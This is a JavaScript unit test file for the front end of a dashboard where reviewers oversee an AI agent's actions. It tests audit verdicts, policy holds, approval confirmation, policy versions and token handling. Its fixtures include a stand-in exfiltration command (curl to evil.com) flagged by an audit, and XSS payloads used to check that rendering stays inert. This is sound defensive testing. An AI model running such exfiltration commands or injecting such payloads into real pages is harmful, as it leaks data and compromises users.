import test from "node:test";
import assert from "node:assert/strict";
import {
  APPROVAL_CONFIRM_COPY,
  LEGACY_POLICY_VERSION_LABEL,
  NOT_APPLICABLE_LABEL,
  POLICY_DECISION_EVENT_TYPES,
  PROVENANCE_LABELS,
  REVIEWER_ACCESS_COPY,
  approvalConfirmStep,
  authFailureHint,
  getHoldIcon,
  getHoldKind,
  getProvenanceLabel,
  getSseBannerCopy,
  groupEventsByTurn,
  isLiveRequested,
  panelStatus,
  policyVersionLabelFor,
  renderHighlightedText,
  renderPanelStatus,
  reviewerAccessState,
  safeTransformApiEvent,
  shouldShowPolicyVersion,
  transformApiEvent,
} from "../scripts/app.js";

// Minimal DOM shim for Node.js unit test execution
if (typeof globalThis.document === "undefined") {
  globalThis.document = {
    createTextNode(text) {
      return {
        nodeType: 3,
        tagName: undefined,
        textContent: String(text),
      };
    },
    createElement(tagName) {
      return {
        nodeType: 1,
        tagName: tagName.toUpperCase(),
        className: "",
        textContent: "",
      };
    },
  };
}

function createContainer() {
  const children = [];
  return {
    children,
    replaceChildren(...nodes) {
      children.length = 0;
      children.push(...nodes);
    },
    append(...nodes) {
      children.push(...nodes);
    },
    get textContent() {
      return children.map((c) => c.textContent).join("");
    },
    querySelectorAll(sel) {
      return children.filter((c) => {
        if (sel === "mark" || sel === "mark.highlight-excerpt") {
          return c.tagName === "MARK";
        }
        if (sel === "script") return c.tagName === "SCRIPT";
        if (sel === "img") return c.tagName === "IMG";
        return false;
      });
    },
  };
}

test("provenance label mapping maps all 4 required provenance types accurately", () => {
  assert.equal(getProvenanceLabel("PROVIDER_EXPOSED_TRACE"), "Provider-exposed trace");
  assert.equal(getProvenanceLabel("AGENT_AUTHORED_SUMMARY"), "Agent-authored summary");
  assert.equal(getProvenanceLabel("UNAVAILABLE"), "Unavailable");
  assert.equal(getProvenanceLabel("SYNTHETIC_FIXTURE"), "Synthetic fixture");

  // Fallbacks & edge cases
  assert.equal(getProvenanceLabel(null), "Unavailable");
  assert.equal(getProvenanceLabel(""), "Unavailable");
  assert.equal(getProvenanceLabel("unknown_type"), "unknown_type");
});

test("transformApiEvent maps every provenance value correctly", () => {
  const baseEvent = {
    id: "ev-1",
    sequence: 1,
    event_type: "ACTION_REQUESTED",
    summary: "Test action",
  };

  // 1. Explicit PROVIDER_EXPOSED_TRACE
  const resProvider = transformApiEvent({
    ...baseEvent,
    details: {
      tool: "workspace",
      exposed_reasoning_trace: "Thinking about step 1...",
      reasoning_provenance: "PROVIDER_EXPOSED_TRACE",
    },
  });
  assert.equal(resProvider.reasoningProvenance, "PROVIDER_EXPOSED_TRACE");
  assert.equal(resProvider.reasoning_provenance, "PROVIDER_EXPOSED_TRACE");
  assert.equal(resProvider.exposedReasoningTrace, "Thinking about step 1...");
  assert.equal(resProvider.reasoningTrace, "Thinking about step 1...");

  // 2. Explicit AGENT_AUTHORED_SUMMARY
  const resSummary = transformApiEvent({
    ...baseEvent,
    details: {
      tool: "workspace",
      reasoning_summary: "Agent summarized step 1.",
      reasoning_provenance: "AGENT_AUTHORED_SUMMARY",
    },
  });
  assert.equal(resSummary.reasoningProvenance, "AGENT_AUTHORED_SUMMARY");
  assert.equal(resSummary.reasoning_provenance, "AGENT_AUTHORED_SUMMARY");
  assert.equal(resSummary.reasoningSummary, "Agent summarized step 1.");
  assert.match(resSummary.reasoningTrace, /Unavailable/);

  // 3. Explicit UNAVAILABLE
  const resUnavail = transformApiEvent({
    ...baseEvent,
    details: {
      tool: "workspace",
      reasoning_provenance: "UNAVAILABLE",
    },
  });
  assert.equal(resUnavail.reasoningProvenance, "UNAVAILABLE");
  assert.equal(resUnavail.reasoning_provenance, "UNAVAILABLE");

  // 4. SYNTHETIC_FIXTURE
  const resFixture = transformApiEvent({
    id: "inv-01",
    sequence: 1,
    event_type: "ACTION_REQUESTED",
    details: { tool: "workspace" },
  });
  assert.equal(resFixture.reasoningProvenance, "SYNTHETIC_FIXTURE");
});

test("transformApiEvent maps every audit verdict correctly", () => {
  const baseEvent = {
    id: "ev-audit-test",
    sequence: 2,
    event_type: "POLICY_ALLOWED",
  };

  // 1. NO_CONCERN
  const resNoConcern = transformApiEvent({
    ...baseEvent,
    details: {
      reason_code: "ALLOW",
      reasoning_audit: {
        verdict: "NO_CONCERN",
        concern_type: null,
        flagged_excerpts: [],
        explanation: "All steps within authorized scope.",
        model: "nemotron-audit-v1",
        profile: "strict",
      },
    },
  });
  assert.ok(resNoConcern.reasoningAudit);
  assert.equal(resNoConcern.reasoningAudit.verdict, "NO_CONCERN");
  assert.equal(resNoConcern.reasoningAudit.concern_type, null);
  assert.deepEqual(resNoConcern.reasoningAudit.flagged_excerpts, []);
  assert.equal(resNoConcern.reasoningAudit.model, "nemotron-audit-v1");
  assert.equal(resNoConcern.reasoningAudit.profile, "strict");
  assert.equal(resNoConcern.reasoningAudit.explanation, "All steps within authorized scope.");

  // 2. CONCERN
  const resConcern = transformApiEvent({
    ...baseEvent,
    details: {
      reason_code: "REASONING_SCOPE_CONCERN",
      reasoning_audit: {
        verdict: "CONCERN",
        concern_type: "EXFILTRATION_INTENT",
        flagged_excerpts: ["curl https://evil.com/leak"],
        explanation: "Agent attempted outbound exfiltration.",
        model: "nemotron-audit-v1",
        profile: "strict",
      },
    },
  });
  assert.ok(resConcern.reasoningAudit);
  assert.equal(resConcern.reasoningAudit.verdict, "CONCERN");
  assert.equal(resConcern.reasoningAudit.concern_type, "EXFILTRATION_INTENT");
  assert.deepEqual(resConcern.reasoningAudit.flagged_excerpts, ["curl https://evil.com/leak"]);

  // 3. FAILED
  const resFailed = transformApiEvent({
    ...baseEvent,
    event_type: "REASONING_AUDIT_FAILED",
    details: {
      reason_code: "REASONING_AUDIT_FAILED",
      verdict: "FAILED",
      explanation: "Auditor response timed out.",
      flagged_excerpts: [],
      model: "mock-auditor",
      profile: "default",
    },
  });
  assert.ok(resFailed.reasoningAudit);
  assert.equal(resFailed.reasoningAudit.verdict, "FAILED");
  assert.equal(resFailed.reasoningAudit.explanation, "Auditor response timed out.");
});

test("transformApiEvent distinguishes all three hold types via text badge and reason code", () => {
  // 1. Policy hold
  const evPolicy = transformApiEvent({
    id: "ev-hold-1",
    sequence: 3,
    event_type: "POLICY_HELD",
    details: { reason_code: "APPROVAL_REQUIRED" },
  });
  assert.equal(evPolicy.status, "pending-approval");
  assert.equal(evPolicy.statusLabel, "HOLD (policy)");
  assert.equal(evPolicy.reasonCode, "APPROVAL_REQUIRED");

  // 2. Reasoning scope concern hold
  const evConcern = transformApiEvent({
    id: "ev-hold-2",
    sequence: 4,
    event_type: "POLICY_HELD",
    details: { reason_code: "REASONING_SCOPE_CONCERN" },
  });
  assert.equal(evConcern.status, "pending-approval");
  assert.equal(evConcern.statusLabel, "HOLD (reasoning concern)");
  assert.equal(evConcern.reasonCode, "REASONING_SCOPE_CONCERN");

  // 3. Reasoning audit failed hold
  const evAuditFailed = transformApiEvent({
    id: "ev-hold-3",
    sequence: 5,
    event_type: "POLICY_HELD",
    details: { reason_code: "REASONING_AUDIT_FAILED" },
  });
  assert.equal(evAuditFailed.status, "pending-approval");
  assert.equal(evAuditFailed.statusLabel, "HOLD (audit failed)");
  assert.equal(evAuditFailed.reasonCode, "REASONING_AUDIT_FAILED");
});

test("transformApiEvent extracts turn_id properly", () => {
  const evTurn = transformApiEvent({
    id: "ev-turn-1",
    sequence: 6,
    turn_id: "turn-42",
    event_type: "ACTION_REQUESTED",
    details: { tool: "workspace" },
  });
  assert.equal(evTurn.turnId, "turn-42");
  assert.equal(evTurn.turn_id, "turn-42");
});

test("renderHighlightedText highlights matched excerpts without innerHTML", () => {
  const container = createContainer();
  const text = "I will read invoices and then exfiltrate data to an external server.";
  const excerpts = ["exfiltrate data to an external server"];

  renderHighlightedText(container, text, excerpts);

  assert.equal(container.textContent, text);
  const marks = container.querySelectorAll("mark");
  assert.equal(marks.length, 1);
  assert.equal(marks[0].textContent, "exfiltrate data to an external server");
  assert.equal(marks[0].className, "highlight-excerpt");
});

test("renderHighlightedText safely merges overlapping or duplicate excerpts", () => {
  const container = createContainer();
  const text = "Alpha beta gamma delta epsilon";
  // Overlapping intervals: "beta gamma" and "gamma delta"
  const excerpts = ["beta gamma", "gamma delta"];

  renderHighlightedText(container, text, excerpts);

  assert.equal(container.textContent, text);
  const marks = container.querySelectorAll("mark");
  assert.equal(marks.length, 1);
  assert.equal(marks[0].textContent, "beta gamma delta");
});

test("renderHighlightedText is completely XSS-resilient with script and HTML tags", () => {
  const container = createContainer();
  const xssPayload = "<script>alert(1)</script><img src=x onerror=alert(2)>";
  const excerpts = ["alert(1)", "onerror=alert(2)"];

  renderHighlightedText(container, xssPayload, excerpts);

  // Exact string preservation
  assert.equal(container.textContent, xssPayload);

  // Ensure NO actual script or img elements were ever created
  assert.equal(container.querySelectorAll("script").length, 0);
  assert.equal(container.querySelectorAll("img").length, 0);

  // Only safe MARK tags and Text nodes
  const marks = container.querySelectorAll("mark");
  assert.equal(marks.length, 2);
  assert.equal(marks[0].textContent, "alert(1)");
  assert.equal(marks[1].textContent, "onerror=alert(2)");
});

test("safeTransformApiEvent never throws and skips malformed frames with a warning", () => {
  const warnings = [];
  const origWarn = console.warn;
  console.warn = (...args) => warnings.push(args.join(" "));
  try {
    assert.equal(safeTransformApiEvent(null), null);
    assert.equal(safeTransformApiEvent(undefined), null);
    assert.equal(safeTransformApiEvent("garbage"), null);
    assert.equal(safeTransformApiEvent(42), null);
    assert.equal(safeTransformApiEvent({}), null, "frame without id/sequence is skipped");
    assert.equal(safeTransformApiEvent({ id: "no-seq" }), null);
  } finally {
    console.warn = origWarn;
  }
  assert.equal(warnings.length, 6);
  assert.ok(warnings.every((w) => /skipping/.test(w)));
});

test("safeTransformApiEvent passes valid frames through unchanged", () => {
  const raw = {
    id: "ev-good",
    sequence: 11,
    event_type: "POLICY_HELD",
    details: { reason_code: "APPROVAL_REQUIRED", tool: "workspace", operation: "delete_path" },
  };
  const viaSafe = safeTransformApiEvent(raw);
  const viaDirect = transformApiEvent({ ...raw, details: { ...raw.details } });
  assert.deepEqual(viaSafe, viaDirect);
  assert.equal(viaSafe.status, "pending-approval");
});

test("hold kinds carry distinct icons plus text (never colour alone)", () => {
  assert.equal(getHoldKind({ status: "pending-approval", reasonCode: "APPROVAL_REQUIRED" }), "policy");
  assert.equal(getHoldKind({ status: "pending-approval", reasonCode: "REASONING_SCOPE_CONCERN" }), "concern");
  assert.equal(getHoldKind({ status: "pending-approval", reasonCode: "REASONING_AUDIT_FAILED" }), "failed");
  assert.equal(getHoldKind({ status: "executed" }), null);
  assert.equal(getHoldKind(null), null);
  const icons = new Set([getHoldIcon("policy"), getHoldIcon("concern"), getHoldIcon("failed")]);
  assert.equal(icons.size, 3, "each hold kind needs its own icon glyph");
  for (const icon of icons) {
    assert.ok(icon.length > 0, "icon glyph must be non-empty text");
  }
  assert.equal(getHoldIcon("unknown"), "");
});

test("approval double-confirm arms first, fires on second, blocks while pending", () => {
  assert.deepEqual(approvalConfirmStep("idle", "approve"), { next: "armed-approve", fire: null });
  assert.deepEqual(approvalConfirmStep("idle", "deny"), { next: "armed-deny", fire: null });
  assert.deepEqual(approvalConfirmStep("armed-approve", "approve"), { next: "pending", fire: "approve" });
  assert.deepEqual(approvalConfirmStep("armed-deny", "deny"), { next: "pending", fire: "deny" });
  // Switching target re-arms instead of firing
  assert.deepEqual(approvalConfirmStep("armed-approve", "deny"), { next: "armed-deny", fire: null });
  assert.deepEqual(approvalConfirmStep("armed-deny", "approve"), { next: "armed-approve", fire: null });
  // Pending actions are single-use: further clicks are ignored
  assert.deepEqual(approvalConfirmStep("pending", "approve"), { next: "pending", fire: null });
  assert.deepEqual(approvalConfirmStep("pending", "deny"), { next: "pending", fire: null });
  // Reset disarms without firing
  assert.deepEqual(approvalConfirmStep("armed-approve", "reset"), { next: "idle", fire: null });
  // Confirm button copy is explicit text, not colour alone
  assert.match(APPROVAL_CONFIRM_COPY.confirmApprove, /Confirm approve/);
  assert.match(APPROVAL_CONFIRM_COPY.confirmDeny, /Confirm deny/);
});

test("panelStatus maps loading/error/empty/ready with explicit copy", () => {
  const copy = { loadingText: "Loading runs…", errorText: "Could not load runs.", emptyText: "No runs available." };
  assert.deepEqual(panelStatus({ loading: true }, copy), { kind: "loading", text: "Loading runs…" });
  // Loading wins over error/empty so spinners never flicker into errors
  assert.deepEqual(panelStatus({ loading: true, error: new Error("x"), count: 0 }, copy).kind, "loading");
  const errStatus = panelStatus({ error: new Error("boom") }, copy);
  assert.equal(errStatus.kind, "error");
  assert.match(errStatus.text, /Could not load runs\./);
  assert.match(errStatus.text, /boom/);
  assert.deepEqual(panelStatus({ count: 0 }, copy), { kind: "empty", text: "No runs available." });
  assert.deepEqual(panelStatus({ count: 3 }, copy), { kind: "ready", text: "" });
});

test("renderPanelStatus toggles the region without innerHTML", () => {
  const region = { hidden: true, textContent: "" };
  assert.equal(renderPanelStatus(region, { kind: "loading", text: "Loading…" }), "loading");
  assert.equal(region.hidden, false);
  assert.equal(region.textContent, "Loading…");
  assert.equal(renderPanelStatus(region, { kind: "ready", text: "" }), "ready");
  assert.equal(region.hidden, true);
});

test("SSE banner copy is visible text with a glyph for reconnecting/stale/polling", () => {
  const recon = getSseBannerCopy("reconnecting", "Reconnecting live stream (attempt 2, retry in 4s)...");
  assert.equal(recon.visible, true);
  assert.ok(recon.glyph.length > 0);
  assert.match(recon.text, /attempt 2/);
  const stale = getSseBannerCopy("stale", "No live frames for 45s. Showing last known state.");
  assert.equal(stale.visible, true);
  assert.match(stale.text, /last known state/);
  const polling = getSseBannerCopy("polling", "Live stream unavailable. Polling for updates.");
  assert.equal(polling.visible, true);
  assert.equal(getSseBannerCopy("connected").visible, false);
  assert.equal(getSseBannerCopy("disconnected").visible, false);
});

test("transformApiEvent keeps attacker-controlled strings as inert data", () => {
  const payload = '<script>alert(1)</script><img src=x onerror=alert(2)>';
  const res = transformApiEvent({
    id: "ev-xss",
    sequence: 99,
    event_type: "ACTION_REQUESTED",
    details: {
      tool: payload,
      operation: payload,
      resource: payload,
      reasoning_summary: payload,
      exposed_reasoning_trace: payload,
    },
  });
  // Verbatim preservation as strings: safe for textContent rendering downstream
  assert.equal(res.tool, payload);
  assert.equal(res.operation, payload);
  assert.equal(res.resource, payload);
  assert.equal(res.reasoningSummary, payload);
  assert.equal(res.exposedReasoningTrace, payload);
  assert.equal(typeof res.title, "string");
});

test("groupEventsByTurn handles empty and snake_case turn ids", () => {
  assert.deepEqual(groupEventsByTurn([]), []);
  assert.deepEqual(groupEventsByTurn(null), []);
  const groups = groupEventsByTurn([
    { id: "a", turn_id: "t-1" },
    { id: "b", turnId: "t-1" },
    { id: "c" },
  ]);
  assert.equal(groups.length, 2);
  assert.equal(groups[0].turnId, "t-1");
  assert.deepEqual(groups[0].events.map((e) => e.id), ["a", "b"]);
  assert.equal(groups[1].turnId, null);
});

test("isLiveRequested: explicit live=0 means static even on the gateway port (#132)", () => {
  assert.equal(isLiveRequested("?live=0", "8000"), false);
  assert.equal(isLiveRequested("?live=0", "8765"), false);
  assert.equal(isLiveRequested("?live=false"), false);
  assert.equal(isLiveRequested("?live=OFF"), false);
  assert.equal(isLiveRequested("?live=no"), false);
});

test("isLiveRequested: live=1 or a bare live parameter means live on any port", () => {
  assert.equal(isLiveRequested("?live=1", "9000"), true);
  assert.equal(isLiveRequested("?live", "9000"), true);
  assert.equal(isLiveRequested("?live=true", ""), true);
});

test("isLiveRequested: without a live parameter, the default port or flag decides", () => {
  assert.equal(isLiveRequested("", "8000"), true);
  assert.equal(isLiveRequested("", "8765"), false);
  assert.equal(isLiveRequested("", "8765", true), true);
  assert.equal(isLiveRequested("?other=live", "8765"), false);
});

test("transformApiEvent joins approval record and surfaces simulated execution markers (#134)", () => {
  const actionId = "act-del-134";
  const turnId = "turn-del-134";

  // 1. Policy holds action
  const held = transformApiEvent({
    id: "ev-hold-134",
    sequence: 1,
    event_type: "POLICY_HELD",
    action_request_id: actionId,
    turn_id: turnId,
    details: {
      operation: "delete_path",
      resource: "outputs/archive_2025.txt",
      reason_code: "APPROVAL_REQUIRED",
    },
  });
  assert.equal(held.status, "pending-approval");
  assert.equal(held.approvalStatus, "Pending reviewer authorization");

  // 2. Reviewer approves
  const granted = transformApiEvent({
    id: "ev-appr-134",
    sequence: 2,
    event_type: "APPROVAL_GRANTED",
    action_request_id: actionId,
    turn_id: turnId,
    actor: "security-reviewer",
    details: {
      reason: "Approved deletion of stale archive",
      approval_request_id: "appr-134",
    },
  });
  assert.equal(granted.approvalStatus, "Approved");
  assert.equal(granted.resolvedBy, "security-reviewer");
  assert.equal(granted.resolutionReason, "Approved deletion of stale archive");

  // 3. Execution event arrives (EXECUTION_SUCCEEDED with simulated receipt)
  const exec = transformApiEvent({
    id: "ev-exec-134",
    sequence: 3,
    event_type: "EXECUTION_SUCCEEDED",
    action_request_id: actionId,
    turn_id: turnId,
    actor: "synthetic-workspace-executor",
    summary: "Successfully executed approved delete_path on 'outputs/archive_2025.txt'.",
    details: {
      status: "EXECUTED",
      result: {
        operation: "delete_path",
        resource: "outputs/archive_2025.txt",
        simulated: true,
        note: "Deletion simulated safely in baseline demo; target not unlinked.",
      },
    },
  });

  // Verify approval join: execution event preserves who approved it
  assert.equal(exec.approvalStatus, "Approved");
  assert.equal(exec.resolvedBy, "security-reviewer");
  assert.equal(exec.resolutionReason, "Approved deletion of stale archive");

  // Verify simulated marker extraction
  assert.equal(exec.executionSimulated, true);
  assert.equal(exec.execution_simulated, true);
  assert.equal(exec.executionNote, "Deletion simulated safely in baseline demo; target not unlinked.");
  assert.equal(
    exec.resultPreview,
    "[Simulated] Deletion simulated safely in baseline demo; target not unlinked."
  );
});

test("transformApiEvent surfaces simulated marker on unheld simulated execution (#134)", () => {
  const exec = transformApiEvent({
    id: "ev-sim-direct",
    sequence: 1,
    event_type: "EXECUTION_SUCCEEDED",
    details: {
      status: "EXECUTED",
      result: {
        simulated: true,
        note: "Direct simulated write.",
      },
    },
  });
  assert.equal(exec.executionSimulated, true);
  assert.equal(exec.executionNote, "Direct simulated write.");
  assert.equal(exec.resultPreview, "[Simulated] Direct simulated write.");
  assert.equal(exec.approvalStatus, null);
});

test("transformApiEvent retains unapproved status on normal allow (#134)", () => {
  const exec = transformApiEvent({
    id: "ev-allow-normal",
    sequence: 1,
    event_type: "EXECUTION_SUCCEEDED",
    action_request_id: "act-normal-134",
    details: {
      status: "EXECUTED",
      result: { preview: "File content read cleanly." },
    },
  });
  assert.equal(exec.executionSimulated, false);
  assert.equal(exec.approvalStatus, null);
  assert.equal(exec.resultPreview, "File content read cleanly.");
});

test("transformApiEvent and UI render explicit unaudited and disabled reasoning states (#127)", () => {
  const baseEvent = {
    id: "ev-unaudited-test",
    sequence: 1,
    event_type: "POLICY_ALLOWED",
  };

  // 1. Unavailable reasoning trace & audit
  const resUnavailable = transformApiEvent({
    ...baseEvent,
    details: {
      reason_code: "ALLOW",
      reasoning_audit: "unavailable",
      reasoning_availability: "unavailable",
      reasoning_provenance: "UNAVAILABLE",
    },
  });
  assert.equal(resUnavailable.reasoningAudit, null);
  assert.equal(resUnavailable.reasoningAuditStatus, "unavailable");

  // 2. Disabled reasoning audit
  const resDisabled = transformApiEvent({
    ...baseEvent,
    details: {
      reason_code: "ALLOW",
      reasoning_audit: "disabled",
      reasoning_availability: "disabled",
    },
  });
  assert.equal(resDisabled.reasoningAudit, null);
  assert.equal(resDisabled.reasoningAuditStatus, "disabled");

  // 3. Fully audited action has status audited
  const resAudited = transformApiEvent({
    ...baseEvent,
    details: {
      reason_code: "ALLOW",
      reasoning_audit: {
        verdict: "NO_CONCERN",
        explanation: "OK",
      },
    },
  });
  assert.ok(resAudited.reasoningAudit);
  assert.equal(resAudited.reasoningAuditStatus, "audited");
});

// ---------------------------------------------------------------------------
// Issue #119: evaluated policy identity in the reviewer UI
// ---------------------------------------------------------------------------

const POLICY_V = "2026-10-03.1+3f2a1b9c8d0e";

function _policyEvent(event_type, details) {
  return {
    id: `ev-${event_type}-${Math.random().toString(16).slice(2)}`,
    sequence: 1,
    run_id: "run-119",
    event_type,
    timestamp: "2026-10-03T00:00:00+00:00",
    actor: "deterministic-policy",
    summary: `synthetic ${event_type}`,
    action_request_id: "action-119",
    policy_decision_id: "decision-119",
    details: details || {},
  };
}

test("decision events surface the stored policy version verbatim (#119)", () => {
  for (const type of ["POLICY_ALLOWED", "POLICY_HELD", "POLICY_DENIED"]) {
    const res = transformApiEvent(
      _policyEvent(type, { outcome: "ALLOW", reason_code: "ALLOWED_TOOL_AND_RESOURCE", policy_version: POLICY_V }),
    );
    assert.equal(res.policyVersion, POLICY_V, `${type} must expose the stored version`);
    assert.equal(res.policyVersionLabel, POLICY_V);
    assert.equal(res.eventType, type);
  }
});

test("pre-version decision events read as unknown, never as a deployed revision (#119)", () => {
  for (const type of POLICY_DECISION_EVENT_TYPES) {
    const res = transformApiEvent(_policyEvent(type, { reason_code: "APPROVAL_REQUIRED" }));
    assert.equal(res.policyVersion, null, `${type} must not invent a version`);
    assert.equal(res.policyVersionLabel, LEGACY_POLICY_VERSION_LABEL);
    assert.equal(shouldShowPolicyVersion(res.eventType, res.policyVersion), true);
  }
  // A blank or whitespace value is treated as missing, not as a version.
  const blank = transformApiEvent(_policyEvent("POLICY_HELD", { policy_version: "   " }));
  assert.equal(blank.policyVersion, null);
  assert.equal(blank.policyVersionLabel, LEGACY_POLICY_VERSION_LABEL);
});

test("events with no policy identity of their own show no version (#119)", () => {
  for (const type of ["ACTION_REQUESTED", "RUN_CREATED", "EXECUTION_SUCCEEDED"]) {
    const res = transformApiEvent(_policyEvent(type, { operation: "read_text" }));
    assert.equal(res.policyVersion, null);
    assert.equal(res.policyVersionLabel, NOT_APPLICABLE_LABEL);
    assert.equal(shouldShowPolicyVersion(res.eventType, res.policyVersion), false);
  }
});

test("policyVersionLabelFor and shouldShowPolicyVersion agree on every case (#119)", () => {
  const cases = [
    ["POLICY_ALLOWED", POLICY_V],
    ["POLICY_ALLOWED", null],
    ["POLICY_DENIED", ""],
    ["APPROVAL_GRANTED", null],
    ["EXECUTION_STARTED", null],
    ["EXECUTION_STARTED", POLICY_V],
    [undefined, undefined],
  ];
  for (const [type, version] of cases) {
    const label = policyVersionLabelFor(type, version);
    const shown = shouldShowPolicyVersion(type, version);
    if (shown) {
      assert.equal(label, version || LEGACY_POLICY_VERSION_LABEL);
      assert.notEqual(label, NOT_APPLICABLE_LABEL);
    } else {
      assert.equal(label, NOT_APPLICABLE_LABEL);
    }
  }
});

test("approval events expose the evaluated version and any recorded drift (#119)", () => {
  const stable = transformApiEvent(
    _policyEvent("APPROVAL_GRANTED", { policy_version: POLICY_V, reason: "ok" }),
  );
  assert.equal(stable.policyVersion, POLICY_V);
  assert.equal(stable.policyVersionChanged, false);
  assert.equal(stable.policyVersionCurrent, null);

  const drifted = transformApiEvent(
    _policyEvent("APPROVAL_GRANTED", {
      policy_version: "2026-01-01.1+aaaabbbbcccc",
      policy_version_current: "2026-02-01.1+ddddeeeeffff",
      policy_version_changed: true,
      reason: "ok",
    }),
  );
  assert.equal(drifted.policyVersion, "2026-01-01.1+aaaabbbbcccc");
  assert.equal(drifted.policyVersionCurrent, "2026-02-01.1+ddddeeeeffff");
  assert.equal(drifted.policyVersionChanged, true);
});

test("policy version is read from details, then a top-level field (#119)", () => {
  const inDetails = transformApiEvent(_policyEvent("POLICY_HELD", { policy_version: POLICY_V }));
  assert.equal(inDetails.policyVersion, POLICY_V);

  const topLevel = transformApiEvent({
    ..._policyEvent("POLICY_HELD", {}),
    policy_version: POLICY_V,
  });
  assert.equal(topLevel.policyVersion, POLICY_V);

  // Details win over a stale top-level copy.
  const both = transformApiEvent({
    ..._policyEvent("POLICY_HELD", { policy_version: POLICY_V }),
    policy_version: "1999-01-01.1+000000000000",
  });
  assert.equal(both.policyVersion, POLICY_V);
});

test("an attacker-controlled version stays inert data (#119)", () => {
  const res = transformApiEvent(
    _policyEvent("POLICY_ALLOWED", { policy_version: "<img src=x onerror=alert(1)>" }),
  );
  assert.equal(typeof res.policyVersion, "string");
  assert.equal(res.policyVersionLabel, "<img src=x onerror=alert(1)>");
});

test("reviewer access state reports the credential without revealing it (#115)", () => {
  assert.equal(reviewerAccessState(false), REVIEWER_ACCESS_COPY.noToken);
  assert.equal(reviewerAccessState(true), REVIEWER_ACCESS_COPY.tokenSet);
  // The state line must say which mutation classes are affected, and must not
  // read as if reads were blocked.
  assert.match(REVIEWER_ACCESS_COPY.noToken, /mutating actions are refused/i);
  assert.match(REVIEWER_ACCESS_COPY.noToken, /[Rr]eading runs, events, and evidence still works/);
  assert.match(REVIEWER_ACCESS_COPY.tokenSet, /in memory for this page only/i);
});

test("authFailureHint points a refused mutation at the reviewer token panel (#115)", () => {
  const denied = new Error("Demo access token required.");
  denied.status = 401;
  const hint = authFailureHint(denied);
  assert.match(hint, /Reviewer access/);
  assert.match(hint, /reviewer token/i);

  // Gate misconfiguration (503) is the other auth-shaped refusal.
  const misconfigured = new Error("Demo access is not configured on this host.");
  misconfigured.status = 503;
  assert.match(authFailureHint(misconfigured), /Reviewer access/);

  // Ordinary failures keep their original copy: no auth speculation.
  const other = new Error("Gateway is temporarily unreachable.");
  other.status = 502;
  assert.equal(authFailureHint(other), "");
  assert.equal(authFailureHint(null), "");

  // The hint never restates or leaks a token value.
  const withTokenText = new Error("Demo access token required.");
  withTokenText.status = 401;
  assert.ok(!authFailureHint(withTokenText).includes("judge-token"));
});
